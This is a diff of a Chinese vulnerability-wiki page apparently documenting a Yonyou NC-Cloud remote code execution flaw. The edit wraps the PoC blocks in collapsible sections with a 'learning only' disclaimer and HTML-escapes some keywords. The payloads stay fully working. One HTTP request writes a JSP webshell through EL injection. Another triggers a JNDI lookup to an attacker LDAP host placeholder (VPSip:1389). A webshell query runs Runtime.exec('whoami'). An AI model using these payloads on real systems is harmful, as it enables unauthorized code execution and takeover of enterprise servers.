@@ -33,8 +33,10 @@ app="用友-NC-Cloud"
 
 验证POC
 
-```
-POST /uapjs/jsinvoke/?action=invoke
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /uapjs/jsinvoke/?action=invoke
 Content-Type: application/json
 
 {
@@ -45,7 +47,7 @@ Content-Type: application/json
         "java.lang.String"
     ], 
     "parameters":[
-        "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
+        "${param.getClass().forName(param.error).newInstance().&#101;val(param.cmd)}",
         "webapps/nc_web/407.jsp"
     ]
 }
@@ -56,14 +58,18 @@ Content-Length: 253
 Content-Type: application/x-www-form-urlencoded
 
 
-{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/301.jsp"]}
-```
+{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/301.jsp"]}</code></pre>
+
+</details>
 
 ![image-20230828164215853](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828164215853.png)
 
-```
-/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) 
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">/cmdtest.jsp?error=bsh.Interpreter&amp;cmd=org.apache.commons.io.IOUtils.toString(&#82;untime.getRuntime().&#101;xec(%22whoami%22).getInputStream()) </code></pre>
+
+</details>
 
 ![image-20230828164239659](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828164239659.png)
 
